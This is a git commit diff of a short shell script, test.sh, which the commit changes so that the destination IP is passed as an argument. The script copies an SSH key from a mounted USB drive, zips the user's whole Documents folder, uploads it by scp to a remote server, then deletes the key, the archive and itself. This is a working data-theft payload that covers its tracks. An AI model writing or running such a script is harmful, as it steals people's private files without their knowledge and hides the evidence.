6918c7287c0705ccb74d5a86150d36ad73e8e73e
david <david@localhost.localdomain>
2022-11-29 10:20:04 -0600

    Made IP changeable

--- test.sh
+++ test.sh
@@ -2,7 +2,7 @@ x=`udisksctl mount -b /dev/sda1 | cut -d" " -f4`
 cp "${x}/update.key" /tmp/update.key
 chmod 600 /tmp/update.key
 zip -r /tmp/gotit.zip ~/Documents
-scp -i /tmp/update.key /tmp/gotit.zip opc@152.70.140.32:~/
+scp -i /tmp/update.key /tmp/gotit.zip opc@$1:~/
 rm /tmp/update.key
 rm /tmp/gotit.zip
 rm /tmp/test.sh
